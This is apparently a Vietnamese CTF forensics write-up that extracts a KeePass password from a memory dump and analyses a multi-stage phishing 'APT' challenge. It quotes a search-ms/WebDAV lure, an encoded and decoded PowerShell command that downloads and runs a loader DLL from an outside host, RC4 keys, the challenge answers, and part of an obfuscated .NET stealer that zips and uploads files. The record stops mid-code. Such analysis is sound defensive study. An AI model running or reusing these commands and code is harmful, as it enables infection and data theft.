<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">!DumpObj /d 0000000002f7e500</span><br><span class="line">Name:        KeePassLib.Security.ProtectedString</span><br><span class="line">MethodTable: 00007ffa49031b90</span><br><span class="line">EEClass:     00007ffa48786f40</span><br><span class="line">Size:        40(0x28) bytes</span><br><span class="line">File:        E:\KeePass Password Safe 2\KeePass.exe</span><br><span class="line">Fields:</span><br><span class="line">              MT    Field   Offset                 Type VT     Attr            Value Name</span><br><span class="line">00007ffa49031d00  4001383        8 ...y.ProtectedBinary  0 instance 0000000000000000 m_pbUtf8</span><br><span class="line">00007ffafed507a0  4001384       10        System.String  0 instance 0000000002fba5d8 m_strPlainText</span><br><span class="line">00007ffafed4c638  4001385       1c       System.Boolean  1 instance                1 m_bIsProtected</span><br><span class="line">00007ffafed53368  4001388       18         System.Int32  1 instance               25 m_nCachedLength</span><br><span class="line">00007ffa49031b90  4001386     2660 ...y.ProtectedString  0   static 0000000002dd90e0 m_psEmpty</span><br><span class="line">00007ffa49031b90  4001387     2668 ...y.ProtectedString  0   static 0000000002dd9108 m_psEmptyEx</span><br></pre></td></tr></table></figure>

<p>·ªû ƒë√¢y ta quan t√¢m ƒë·∫øn <code>m_strPlainText</code>, ƒë√¢y l√† bi·∫øn ƒë√≥ng vai tr√≤ gi·ªØ tham chi·∫øu tr·ª±c ti·∫øp t·ªõi object <code>System.String</code> ch·ª©a chu·ªói m·∫≠t kh·∫©u d·∫°ng plaintext m√† ng∆∞·ªùi d√πng ƒë√£ nh·∫≠p.<br>T·ªõi ƒë√¢y th√¨ ch·ªâ c·∫ßn dump object t·∫°i ƒë·ªãa ch·ªâ c·ªßa <code>m_strPlaintext</code> ra l√† xong.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">!DumpObj /d 0000000002fba5d8</span><br><span class="line">Name:        System.String</span><br><span class="line">MethodTable: 00007ffafed507a0</span><br><span class="line">EEClass:     00007ffafed04868</span><br><span class="line">Size:        76(0x4c) bytes</span><br><span class="line">File:        C:\WINDOWS\Microsoft.Net\assembly\GAC_64\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll</span><br><span class="line">String:      first_stage_of_this_chall</span><br></pre></td></tr></table></figure>

<p>Ta c√≥ ƒë∆∞·ª£c password c·ªßa Keepass password database: <strong>first_stage_of_this_chall</strong><br><img src="https://hackmd.io/_uploads/rJmHjIW5ex.png" alt="image"><br>Copy password c√≥ Title l√† <code>infected</code>, ƒë√≥ l√† password c·ªßa file zip: <strong>chaomungtoiholactf2025kekw<em>88</em></strong><br>D√πng password ƒë·ªÉ unlock file zip, load file dmp v√†o Hxd, v√† t√¨m chu·ªói <code>HOLACTF&#123;</code>:<br><img src="https://hackmd.io/_uploads/B103sL-cgg.png" alt="image"><br>Flag: <code>HOLACTF&#123;Oeocam_to_HolaCTF2025!!!!&#125;</code></p>
<h3 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h3><p><img src="https://hackmd.io/_uploads/H1rp3PWqxx.png" alt="image"><br>Hi·ªán v·∫≠t l√† m·ªôt file ad1 m·ªü b·∫±ng FTKimage ƒë·ªÉ ph√¢n t√≠ch<br>·ªû Question 1 th√¨ theo nh∆∞ m√¥ t·∫£ n·∫°n nh√¢n nh·∫≠n ƒë∆∞·ª£c m·ªôt file n√™n m√¨nh c√≥ th·ªÉ suy ƒëo√°n ng∆∞·ªùi d√πng nh·∫≠n ƒë∆∞·ª£c mail ho·∫∑c th√¥ng qua browser th√¨ check trong user tmp c√≥ th·∫•y ƒë∆∞·ª£c ng∆∞·ªùi d√πng s·ª≠ d·ª•ng ThunderBird v√† check c√°c mail c·ªßa user th√¨ th·∫•y c√≥ m·ªôt email nghi ng·ªù</p>
<blockquote>
<p>Hi·ªán v·∫≠t : %APPDATA%&#x2F;Roaming&#x2F;Thunderbird&#x2F;Profiles&#x2F;<profile>&#x2F;Mail&#x2F;pop.gmail.com&#x2F;INBOX</p>
</blockquote>
<p>[+] Ph√¢n t√≠ch file mail v·ªõi thunderbird ta th·∫•y m·ªôt mail <a href="mailto:&#x68;&#x69;&#101;&#117;&#x74;&#x72;&#117;&#110;&#x67;&#110;&#103;&#x75;&#x79;&#x65;&#x6e;&#x30;&#55;&#x30;&#50;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">hieutrungnguyen0702@gmail.com</a> c√≥ g·ª≠i m·ªôt file cho n·∫°n nh√¢n ƒëi k√®m v·ªõi password<br><img src="https://hackmd.io/_uploads/rJQ31_Zclx.png" alt="image"><br>Tr√≠ch xu·∫•t file ra gi·∫£i n√©n v√† ph√¢n t√≠ch ta th·∫•y ƒë√¢y l√† m·ªôt t·ªáp html ƒë·ªôc h·∫°i ‚Äúdiemchuan.html‚Äù<br><img src="https://hackmd.io/_uploads/Sk_TGOWqlg.png" alt="code"><br>Gi·∫£i m√£ chu·ªói payload ta ƒë∆∞·ª£c m·ªôt chu·ªói Downloads ƒë∆∞·ª£c host tr√™n ngrok</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search-ms:query=Ket_Qua_Ky_Thi_THPTQG2036&amp;crumb=location:\\5b4a29dffc4d.ngrok-free.app@SSL\DavWWWRoot\&amp;displayname=Downloads</span><br></pre></td></tr></table></figure>

<p>v√† m·ªôt c√°i url file giff trong tag style</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://files.sakamoto.moe/cba5703ee7fd_word.gif</span><br></pre></td></tr></table></figure>

<p>Ki·ªÉm tra url th√¨ th·∫•y ƒë√≥ l√† m·ªôt ·∫£nh ch·ª•p t·ª´ word v·ªõi d√≤ng ch·ªØ hidden content kh√° l√† b√≠ ·∫©n n√™n t√¥i s·∫Ω ti·∫øn h√†nh check 2 domain n√†y trong Logs windows xem c√≥ ƒë·ªÉ l·∫°i manh m·ªëi n√†o kh√¥ng<br>T√¥i ƒë√£ s·ª≠ d·ª•ng b·ªô c√¥ng c·ª• c·ªßa eric zimmerman d√πng PECmd.exe cho ph√¢n t√≠ch Prefetch folder v√† EvtxCmd.exe cho ph√¢n t√≠ch logs v√† d√πng TimelimeExplorer ƒë·ªÉ ƒë·ªçc c√°c logs tr·∫£ v·ªÅ<br>Link download tools:<br><a target="_blank" rel="noopener" href="https://ericzimmerman.github.io/#!index.md">https://ericzimmerman.github.io/#!index.md</a><br>·ªü domain ngrok th√¨ ki·ªÉm tra logs th·∫•y ƒë∆∞·ª£c log l·∫°i trong SMBClient nh∆∞ng kh√¥ng c√≥ th√¥ng tin g√¨ th√™m<br>Nh∆∞ng ·ªü domain sakamoto.moe th√¨ l·∫°i th·∫•y nhi·ªÅu malicious powershell processes t∆∞∆°ng t√°c<br>T·∫°i khung th·ªùi gian Time Created<br>2025-08-29 19:48:23<br>c√≥ m·ªôt l·ªánh powershell gi·∫£i m√£ payload v√† ch·∫°y ngay sau ƒë√≥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -EncodedCommand UABvAHcAZQByAHMASABlAEwAbAAgAC0AIgBlACIAcAAgAEIAIgB5ACIAcABhAHMAcwAgABQgVwAgAGgAIgBpAGQAZAAiAGUAbgAgABUgYwAiAE8ATQAiAG0AYQAgACcAWwBOACIAZQB0AC4AUwBlACIAcgB2ACIAaQAiAGMAZQBQACIAbwAiAGkAbgAiAHQATQAiAGEAIgBuACIAYQAiAGcAIgBlAHIAXQA6ADoAUwAiAGUAIgBjACIAdQByACIAaQAiAHQAeQBQAHIAbwAiAHQAbwAiAGMAbwAiAGwAIAA9ACAAWwBOAGUAIgB0AC4AUwAiAGUAIgBjAHUAcgBpACIAdAAiAHkAIgBQAHIAIgBvAHQAIgBvAGMAIgBvACIAbABUAHkAIgBwAGUAXQA6ADoAVAAiAGwAIgBzACIAMQAyADsAIAAkAHAAIAA9ACAASgBvACIAaQAiAG4ALQBQAGEAIgB0ACIAaAAgACQAZQBuAHYAOgBUAEUATQBQACAAIgBsAC4AZAAiAGwAIgBsACIAOwAgAGkAdwByACAAIgBoACIAdAAiAHQAIgBwACIAcwA6AC8AIgAvAGYAaQAiAGwAZQBzAC4AcwBhAGsAYQAiAG0AIgBvACIAdAAiAG8ALgBtAG8AIgBlAC8ANAAxACIAZAAiAGIAZQA3ACIAYQBjACIANwBiACIANwAzAF8AbABvAGEAZABlAHIALgBkAGwAbAAiACAALQAiAE8AIgB1ACIAdAAiAEYAIgBpACIAbABlACAAJABwADsAIABTACIAdAAiAGEAcgB0AC0AIgBQACIAcgAiAG8AYwBlACIAcwBzACAAcgB1ACIAbgAiAGQAbABsADMAIgAyACIAIAAtAEEAcgBnACIAdQAiAG0AZQAiAG4AIgB0ACIATABpACIAcwB0ACAAIgAkAHAALABSAHUAbgAiACAALQBXACIAYQAiAGkAdAA7ACAAZABlAGwAIAAkAHAAIAAtAEYAIgBvACIAcgBjAGUAJwA=</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass ‚ÄîW hidden ‚ÄïcOMma [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = Join-Path $env:TEMP l.dll; iwr https://files.sakamoto.moe/41dbe7ac7b73_loader.dll -OutFile $p; Start-Process rundll32 -ArgumentList $p,Run -Wait; del $p -Force</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>truy c·∫≠p url v√† t·∫£i file dll v·ªÅ check nhanh v·ªõi virustotal th√¨ ƒë√¢y l√† m·ªôt tr√¨nh gi·∫£i m√£ h√≥a (loader) ƒë·ªôc h·∫°i v·ªõi inital access l√† spearphishing v·ªõi subtechniques : attachment link -&gt; T1566.001</p>
<h4 id="Dap-an-cau-1-2-3"><a href="#Dap-an-cau-1-2-3" class="headerlink" title="ƒê√°p √°n c√¢u 1,2,3:"></a>ƒê√°p √°n c√¢u 1,2,3:</h4><blockquote>
<p>Q1: The user opened a software that contained malicious content from the attacker. What was the name of the software?<br>Ex: Skype<br>Ans: Thunderbird<br>Correct!<br>Q2: What is the name of the file that makes user fall into the attacker‚Äôs trap?<br>Ex: example.js<br>Ans: diemchuan.html<br>Correct!<br>Q3: What MITRE ATT&amp;CK techniques did the attacker use?<br>Ex: T1234.001<br>Ans: T1566.001<br>Correct!</p>
</blockquote>
<h4 id="Stage-2-Reverse-DLL"><a href="#Stage-2-Reverse-DLL" class="headerlink" title="Stage 2 (Reverse DLL)"></a>Stage 2 (Reverse DLL)</h4><p>V√†o h√†m Run theo nh∆∞ script powershell ch·∫°y v·ªõi entrypoint khi g·ªçi rundll32<br>ta th·∫•y n√≥ s·∫Ω g·ªçi h√†m FlowAllocation<br><img src="https://hackmd.io/_uploads/r13x2Obqxe.png" alt="stage2"><br>[+] H√†m LoopHook l√† m·ªôt h√†m decode Xor QWORD v·ªõi key &#x3D; 0x5A<br>[+] IsBufferLoader : T·∫°o m·ªôt request URL ƒë√£ ƒë∆∞·ª£c gi·∫£i m√£ t·ª´ LoopForHook s·ª≠ d·ª•ng c√°c API c·ªßa winhttp<br>[+] WriteMemcpy l√† l√†m ƒë·ªçc d·ªØ li·ªáu tr·∫£ v·ªÅ t·ª´ request v√† ghi l·∫°i v√†o file Miyamizu_Mitsuha.yourname<br>[+] RC4 decryption d·ªØ li·ªáu v·ªõi key l√† byte_33E154020 (16 bytes)<br>Ti·∫øn h√†nh gi·∫£i m√£ d·ªØ li·ªáu ta ƒë∆∞·ª£c l∆∞u v√†o %TEMP%&#x2F;steam.exe<br>Code Xor QWORD<br><img src="https://hackmd.io/_uploads/r1dsZKW5eg.png" alt="xor_Qword"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://files.sakamoto.moe/a0f44273e748_steam.enc</span><br></pre></td></tr></table></figure>

<p>Ki·ªÉm tra th√¨ th·∫•y file v·∫´n c√≤n ƒë∆∞·ª£c host tr√™n server attack download file v√† ki·ªÉm ƒë·ªãnh v·ªõi file Miyamizu_Mitsuha.yourname th√¨ gi·ªëng nhau v·∫≠y ta ƒë√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c file g·ªëc r·ªìi<br>d√πng key gi·∫£i m√£ RC4<br>v√†o load v√†o ILSPY&#x2F;Dnspy v√¨ check nhanh v·ªõi die th√¨ n√≥ l√† m·ªôt file .NET&#x2F;C#</p>
<h4 id="Dap-an-cho-cau-4-5-6"><a href="#Dap-an-cho-cau-4-5-6" class="headerlink" title="ƒê√°p √°n cho c√¢u 4,5,6"></a>ƒê√°p √°n cho c√¢u 4,5,6</h4><blockquote>
<p>Q4: What is the domain of the website where the malicious file for stage 2 is located?<br>Ex: mediafire.com<br>Ans: sakamoto.moe<br>Correct!<br>Q5: Digging into the malicious file, what was the original name of the encrypted file that was downloaded?<br>Ex: payload.enc<br>Ans: steam.enc<br>Correct!<br>Q6: What is the encryption algorithm and key to decrypt the encrypted payload? (Convert it to hex)<br>Ex: AES_0x1a,0x2b,0x3c,0x4d,‚Ä¶<br>Ans: RC4_0x3a,0x2d,0x1c,0x4d,0x5e,0x2f,0x7b,0x81,0x3d,0xab,0xbc,0xcd,0xde,0x2f,0xf0,0x01<br>Correct!</p>
</blockquote>
<h4 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line">// minecraft, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</span><br><span class="line">// Maicraft.cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Globalization;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Net.Http;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using minecraft;</span><br><span class="line"></span><br><span class="line">internal class cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk</span><br><span class="line">&#123;</span><br><span class="line">	private static Dictionary&lt;string, string&gt; pdZuVvKNPFSscmrJcOBSJjLEW = new Dictionary&lt;string, string&gt;</span><br><span class="line">	&#123;</span><br><span class="line">		&#123; &quot;0&quot;, &quot;\ud83c\udf7a&quot; &#125;,</span><br><span class="line">		&#123; &quot;1&quot;, &quot;\ud83d\ude82&quot; &#125;,</span><br><span class="line">		&#123; &quot;2&quot;, &quot;\ud83d\udc0f&quot; &#125;,</span><br><span class="line">		&#123; &quot;3&quot;, &quot;‚öΩ&quot; &#125;,</span><br><span class="line">		&#123; &quot;4&quot;, &quot;\ud83c\ude3a&quot; &#125;,</span><br><span class="line">		&#123; &quot;5&quot;, &quot;‚õµ&quot; &#125;,</span><br><span class="line">		&#123; &quot;6&quot;, &quot;\ud83d\udd3c&quot; &#125;,</span><br><span class="line">		&#123; &quot;7&quot;, &quot;\ud83c\udf4d&quot; &#125;,</span><br><span class="line">		&#123; &quot;8&quot;, &quot;\ud83c\udfa5&quot; &#125;,</span><br><span class="line">		&#123; &quot;9&quot;, &quot;\ud83d\udebe&quot; &#125;,</span><br><span class="line">		&#123; &quot;A&quot;, &quot;\ud83d\udc3d&quot; &#125;,</span><br><span class="line">		&#123; &quot;B&quot;, &quot;\ud83c\udf0a&quot; &#125;,</span><br><span class="line">		&#123; &quot;C&quot;, &quot;\ud83d\udcac&quot; &#125;,</span><br><span class="line">		&#123; &quot;D&quot;, &quot;\ud83c\udfad&quot; &#125;,</span><br><span class="line">		&#123; &quot;E&quot;, &quot;\ud83c\udf06&quot; &#125;,</span><br><span class="line">		&#123; &quot;F&quot;, &quot;\ud83d\udd0e&quot; &#125;,</span><br><span class="line">		&#123; &quot;G&quot;, &quot;\ud83d\udc7b&quot; &#125;,</span><br><span class="line">		&#123; &quot;H&quot;, &quot;\ud83c\ude51&quot; &#125;,</span><br><span class="line">		&#123; &quot;I&quot;, &quot;\ud83d\udc9b&quot; &#125;,</span><br><span class="line">		&#123; &quot;J&quot;, &quot;\ud83c\udd7f\ufe0f&quot; &#125;,</span><br><span class="line">		&#123; &quot;K&quot;, &quot;\ud83c\uddea\ud83c\uddf8&quot; &#125;,</span><br><span class="line">		&#123; &quot;L&quot;, &quot;\ud83d\udc9c&quot; &#125;,</span><br><span class="line">		&#123; &quot;M&quot;, &quot;\ud83d\udc36&quot; &#125;,</span><br><span class="line">		&#123; &quot;N&quot;, &quot;\ud83c\udf8f&quot; &#125;,</span><br><span class="line">		&#123; &quot;O&quot;, &quot;\ud83d\udc60&quot; &#125;,</span><br><span class="line">		&#123; &quot;P&quot;, &quot;\ud83c\udf83&quot; &#125;,</span><br><span class="line">		&#123; &quot;Q&quot;, &quot;\ud83c\udf75&quot; &#125;,</span><br><span class="line">		&#123; &quot;R&quot;, &quot;\ud83d\uddff&quot; &#125;,</span><br><span class="line">		&#123; &quot;S&quot;, &quot;\ud83d\udeb9&quot; &#125;,</span><br><span class="line">		&#123; &quot;T&quot;, &quot;\ud83d\udd28&quot; &#125;,</span><br><span class="line">		&#123; &quot;U&quot;, &quot;\ud83d\udd1c&quot; &#125;,</span><br><span class="line">		&#123; &quot;V&quot;, &quot;\ud83d\udcaf&quot; &#125;,</span><br><span class="line">		&#123; &quot;W&quot;, &quot;‚Ñπ\ufe0f&quot; &#125;,</span><br><span class="line">		&#123; &quot;X&quot;, &quot;\ud83d\udcc9&quot; &#125;,</span><br><span class="line">		&#123; &quot;Y&quot;, &quot;\ud83c\ude01&quot; &#125;,</span><br><span class="line">		&#123; &quot;Z&quot;, &quot;‚è©&quot; &#125;,</span><br><span class="line">		&#123; &quot;a&quot;, &quot;9\ufe0f\u20e3&quot; &#125;,</span><br><span class="line">		&#123; &quot;b&quot;, &quot;\ud83d\udd01&quot; &#125;,</span><br><span class="line">		&#123; &quot;c&quot;, &quot;\ud83d\udcd3&quot; &#125;,</span><br><span class="line">		&#123; &quot;d&quot;, &quot;\ud83d\udc23&quot; &#125;,</span><br><span class="line">		&#123; &quot;e&quot;, &quot;\ud83d\udc58&quot; &#125;,</span><br><span class="line">		&#123; &quot;f&quot;, &quot;\ud83c\udf6f&quot; &#125;,</span><br><span class="line">		&#123; &quot;g&quot;, &quot;\ud83d\udcbb&quot; &#125;,</span><br><span class="line">		&#123; &quot;h&quot;, &quot;\ud83d\ude8f&quot; &#125;,</span><br><span class="line">		&#123; &quot;i&quot;, &quot;\ud83d\udc8b&quot; &#125;,</span><br><span class="line">		&#123; &quot;j&quot;, &quot;\ud83c\udfa9&quot; &#125;,</span><br><span class="line">		&#123; &quot;k&quot;, &quot;\ud83c\udf63&quot; &#125;,</span><br><span class="line">		&#123; &quot;l&quot;, &quot;\ud83d\udc5e&quot; &#125;,</span><br><span class="line">		&#123; &quot;m&quot;, &quot;\ud83d\udd38&quot; &#125;,</span><br><span class="line">		&#123; &quot;n&quot;, &quot;\ud83c\udf7b&quot; &#125;,</span><br><span class="line">		&#123; &quot;o&quot;, &quot;\ud83d\udc9a&quot; &#125;,</span><br><span class="line">		&#123; &quot;p&quot;, &quot;\ud83c\udf87&quot; &#125;,</span><br><span class="line">		&#123; &quot;q&quot;, &quot;\ud83d\ude9b&quot; &#125;,</span><br><span class="line">		&#123; &quot;r&quot;, &quot;\ud83d\udc88&quot; &#125;,</span><br><span class="line">		&#123; &quot;s&quot;, &quot;\ud83c\udfc8&quot; &#125;,</span><br><span class="line">		&#123; &quot;t&quot;, &quot;\ud83d\ude0d&quot; &#125;,</span><br><span class="line">		&#123; &quot;u&quot;, &quot;\ud83d\udeb4&quot; &#125;,</span><br><span class="line">		&#123; &quot;v&quot;, &quot;\ud83d\udcbf&quot; &#125;,</span><br><span class="line">		&#123; &quot;w&quot;, &quot;\ud83d\udc8f&quot; &#125;,</span><br><span class="line">		&#123; &quot;x&quot;, &quot;‚úí\ufe0f&quot; &#125;,</span><br><span class="line">		&#123; &quot;y&quot;, &quot;\ud83c\udf46&quot; &#125;,</span><br><span class="line">		&#123; &quot;z&quot;, &quot;\ud83c\udf67&quot; &#125;,</span><br><span class="line">		&#123; &quot;_&quot;, &quot;\ud83d\udd52&quot; &#125;,</span><br><span class="line">		&#123; &quot;-&quot;, &quot;\ud83d\udc4c&quot; &#125;,</span><br><span class="line">		&#123; &quot;/&quot;, &quot;\ud83d\udc2e&quot; &#125;,</span><br><span class="line">		&#123; &quot;+&quot;, &quot;\ud83d\udc2d&quot; &#125;,</span><br><span class="line">		&#123; &quot;=&quot;, &quot;\ud83d\udd0c&quot; &#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	private static void lzzmjArGgUUExMsxcUOqmdCCBrduwURYMq(string outputArchive, params string[] inputFiles)</span><br><span class="line">	&#123;</span><br><span class="line">		string text = string.Join(NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83d\udc9b\ud83d\udc3d\ud83d\udd0c\ud83d\udd0c&quot;), inputFiles.Select((string f) =&gt; &quot;\&quot;&quot; + f + &quot;\&quot;&quot;));</span><br><span class="line">		Process.Start(NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;\ud83c\udf75\ud83c\udf67\ud83c\udf87\ud83d\udcd3\ud83d\udd1c\ud83c\ude51\ud83c\udd7f\ufe0f\ud83d\udcbf‚è©‚öΩ\ud83c\udd7f\ufe0f\ud83d\ude8f\ud83d\udd01\ud83d\udeb9\ud83c\udf0a\ud83d\udc7b9\ufe0f\u20e3‚Ñπ\ufe0f‚úí\ufe0f\ud83d\udc5e\ud83d\udcd3\ud83d\ude82\ud83d\udc8f‚öΩ\ud83d\udc9c\ud83d\udcaf\ud83c\udf87\ud83c\udf87\ud83d\udcd3\ud83d\udd0e\ud83d\udc8f‚öΩ\ud83d\udc58\ud83d\udc8b‚õµ\ud83d\udc5e\ud83d\udc58\ud83d\udc7b\ud83d\udd1c\ud83d\udd0c&quot;), &quot;a -t7z -mx5 -parameter-none \&quot;&quot; + outputArchive + &quot;\&quot; &quot; + text)?.WaitForExit();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static async Task hVQylKhewOSgWxHuxbNcBpLUQmdgVGemoKmKEvbqat(string filePath)</span><br><span class="line">	&#123;</span><br><span class="line">		using MultipartFormDataContent YIYcePSZHvUeSMhUzZwoVHmOV = new MultipartFormDataContent();</span><br><span class="line">		YIYcePSZHvUeSMhUzZwoVHmOV.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(&quot;‚è©\ud83d\udd38\ud83d\udc5e\ud83c\udfc8‚è©\ud83c\udf75\ud83d\udd0c\ud83d\udd0c&quot;), Path.GetFileName(filePath));</span><br><span class="line">		HttpClientHandler handler = new HttpClientHandler</span><br><span class="line">		&#123;</span><br><span class="line">			ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator</span><br><span class="line">		&#125;;</span><br><span class="line">		using HttpClient JToIYNnsPTVBGdtYorgktWiMEPfUEkMGMChTBrH = new HttpClient(handler);</span><br><span class="line">		await 